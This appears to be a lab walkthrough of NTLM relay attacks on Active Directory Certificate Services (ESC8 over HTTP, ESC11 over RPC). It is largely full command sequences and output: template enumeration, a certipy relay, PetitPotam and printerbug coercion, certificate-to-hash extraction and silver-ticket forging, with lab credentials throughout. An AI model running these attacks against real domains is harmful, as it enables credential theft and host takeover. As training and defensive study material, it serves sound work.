This article will cover a very "niche" way of abusing NTLM relay over HTTP/RPC protocols and leverage over the ESC8/11 techniques in a ADCS environment.

## Attack Scenario
We must start by identifying which one is the ADCS in the AD environment.
```shell-session
crackmapexec ldap 172.16.117.0/24 -u 'plaintext$' -p 'o6@ekK5#rlw2rAe' -M adcs

<SNIP>
LDAP        172.16.117.3    389    DC01             [+] INLANEFREIGHT.LOCAL\plaintext$:o6@ekK5#rlw2rAe 
ADCS        172.16.117.3    389    DC01             [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS                                                Found PKI Enrollment Server: DC01.INLANEFREIGHT.LOCAL
ADCS                                                Found CN: INLANEFREIGHT-DC01-CA
Running CME against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```
Now we need to identify potential certificate templates that can be used(Machine Template is the juicy one as it most likely support ClientAuthentication).
```shell-session
crackmapexec ldap 172.16.117.3 -u plaintext$ -p 'o6@ekK5#rlw2rAe' -M adcs -o SERVER=INLANEFREIGHT-DC01-CA

SMB         172.16.117.3    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
LDAP        172.16.117.3    389    DC01             [+] INLANEFREIGHT.LOCAL\plaintext$:o6@ekK5#rlw2rAe 
ADCS                                                Using PKI CN: INLANEFREIGHT-DC01-CA
ADCS        172.16.117.3    389    DC01             [*] Starting LDAP search with search filter '(distinguishedName=CN=INLANEFREIGHT-DC01-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,'
ADCS                                                Found Certificate Template: DirectoryEmailReplication
ADCS                                                Found Certificate Template: DomainControllerAuthentication
ADCS                                                Found Certificate Template: KerberosAuthentication
ADCS                                                Found Certificate Template: EFSRecovery
ADCS                                                Found Certificate Template: EFS
ADCS                                                Found Certificate Template: DomainController
ADCS                                                Found Certificate Template: WebServer
ADCS                                                Found Certificate Template: Machine
ADCS                                                Found Certificate Template: User
ADCS                                                Found Certificate Template: SubCA
ADCS                                                Found Certificate Template: Administrator
```
This step can be obtained with much, much more verbose via Certipy.
```shell-session
certipy find -enabled -u 'plaintext$'@172.16.117.3 -p 'o6@ekK5#rlw2rAe' -stdout

Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'INLANEFREIGHT-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'INLANEFREIGHT-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'INLANEFREIGHT-DC01-CA' via RRP
[*] Got CA configuration for 'INLANEFREIGHT-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : INLANEFREIGHT-DC01-CA
    DNS Name                            : DC01.INLANEFREIGHT.LOCAL
    Certificate Subject                 : CN=INLANEFREIGHT-DC01-CA, DC=INLANEFREIGHT, DC=LOCAL
    Certificate Serial Number           : 110830E19B30B89546FA6D338A2C42DD
    Certificate Validity Start          : 2023-07-12 14:05:58+00:00
    Certificate Validity End            : 2028-07-12 14:15:57+00:00
    Web Enrollment                      : Enabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Disabled
    Permissions
      Owner                             : INLANEFREIGHT.LOCAL\Administrators
      Access Rights
        ManageCertificates              : INLANEFREIGHT.LOCAL\Administrators
                                          INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
        ManageCa                        : INLANEFREIGHT.LOCAL\Administrators
                                          INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
        Enroll                          : INLANEFREIGHT.LOCAL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue
```
### ESC8 Scenario
The whole story turns around **HTTP-based enrollment** feature of the ADCS which allows a certificate enrollment via HTTP method. 
The `HTTP` protocol does not verify the `NTLM signature` during authentication. Therefore, if the HTTP enrollment endpoint is enabled, we can obtain NTLM authentication (via authentication coercion or poisoning), relay it to the PKI server's HTTP endpoint, and request a certificate for the authenticated account.
<font color="#c00000">(For more details please check the ADCS documents.)</font>
Firstly, we must be sure that the Web Enrollment portal supports NTML authentication:
```shell-session
curl -I http://172.16.117.3/certsrv/

HTTP/1.1 401 Unauthorized
Content-Length: 1293
Content-Type: text/html
Server: Microsoft-IIS/10.0
WWW-Authenticate: Negotiate
WWW-Authenticate: NTLM
X-Powered-By: ASP.NET
Date: Fri, 11 Aug 2023 20:52:44 GMT
```
Next we can start with the real attack by starting *Certipy* to relay with the **Machine Template** over the ADCS(aka DC).
```shell-session
sudo certipy relay -target "http://172.16.117.3" -template Machine
 
Certipy v4.7.0 - by Oliver Lyak (ly4k)
[*] Targeting http://172.16.117.3/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
```
Now we need to invoke the Authentication Coercion via *nltmrelayx/coercer* or similar stuff.
```shell-session
python3 printerbug.py inlanefreight/plaintext$:'o6@ekK5#rlw2rAe'@172.16.117.50 172.16.117.30

//OR we can use PetitPotam
python3 PetitPotam.py 172.16.119.20 172.16.119.70 -u 'yovecio$' -p '7uKGUOeiAfS>xPQ' -d inlanefreight.local
```
And now we can use the certificate received to get a valid TGT.
```shell-session
certipy auth -pfx ws01.pfx -dc-ip 172.16.117.3

Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Using principal: ws01$@inlanefreight.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ws01.ccache'
[*] Trying to retrieve NT hash for 'ws01$'
[*] Got hash for 'ws01$@inlanefreight.local': aad3b435b51404eeaad3b435b51404ee:3d3a72af94548ebc7755287a88476460
```
We get the **DomainSID** so we can perform a *"Silver Ticket"* attack.
```shell-session
lookupsid.py 'INLANEFREIGHT.LOCAL/WS01$'@172.16.117.3 -hashes :3d3a72af94548ebc7755287a88476460

Impacket v0.10.1.dev1+20230718.100545.fdbd2568 - Copyright 2022 Fortra

[*] Brute forcing SIDs at 172.16.117.3
[*] StringBinding ncacn_np:172.16.117.3[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1207890233-375443991-2397730614
```
And with this we can craft a **Silver Ticket** in order to take over the host. Use the NTLM hash from **WS01$, Domain SID** to forge a CIFS ST(Service Ticket).
```shell-session
 ticketer.py -nthash 3d3a72af94548ebc7755287a88476460 -domain-sid S-1-5-21-1207890233-375443991-2397730614 -domain inlanefreight.local -spn cifs/ws01.inlanefreight.local Administrator
```
Use the *ccache* obtained to take your attacks further into AD environment.

### ESC11 Scenario
This other attack scenario is basically same as the ESC8 where the main target is the Web Enrollment Service but this time the vector will be carried via **RPC protocol** and not HTTP as in the one before.
In dept it is about the setting **IF_ENFORCEENCRYPTICERTREQUEST** is *UNSET* on the ADCS backend then the certificate requests between Client/PKI won't be encrypted allowing us to perform this attack.
We start by spinning up a listening relay over the machine(this time we are using **rpc** and not **http** as before.).
```shell-session
certipy relay -target "rpc://172.16.117.3" -ca "INLANEFREIGHT-DC01-CA"
 
Certipy v4.7.0 - by Oliver Lyak (ly4k)
[*] Targeting rpc://172.16.117.3 (ESC11)
[*] Listening on 0.0.0.0:445
```
Now we can force WS01$ to perform a Authentication coercion back to our listener.
```shell-session
python3 printerbug.py inlanefreight/plaintext$:'o6@ekK5#rlw2rAe'@172.16.117.50 172.16.117.30

//OR we can use Petitpotam
python3 PetitPotam.py 172.16.119.20 172.16.119.70 -u 'yovecio$' -p '7uKGUOeiAfS>xPQ' -d inlanefreight.local
```
After a while we should be able to obtain a valid pfx that can be used with the "auth" option to request a valid TGT ticket for the WS01$ machine object.
```shell-session
certipy auth -pfx ws01.pfx -dc-ip 172.16.117.3
```
And again we get the **DomainSID** so we can perform a *"Silver Ticket"* attack.
```shell-session
lookupsid.py 'INLANEFREIGHT.LOCAL/WS01$'@172.16.117.3 -hashes :3d3a72af94548ebc7755287a88476460

Impacket v0.10.1.dev1+20230718.100545.fdbd2568 - Copyright 2022 Fortra

[*] Brute forcing SIDs at 172.16.117.3
[*] StringBinding ncacn_np:172.16.117.3[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1207890233-375443991-2397730614
```
And with this we can craft a **Silver Ticket** in order to take over the host. Use the NTLM hash from **WS01$, Domain SID** to forge a CIFS ST(Service Ticket).
```shell-session
 ticketer.py -nthash 3d3a72af94548ebc7755287a88476460 -domain-sid S-1-5-21-1207890233-375443991-2397730614 -domain inlanefreight.local -spn cifs/ws01.inlanefreight.local Administrator
```
Use the *ccache* obtained to take your attacks further into AD environment.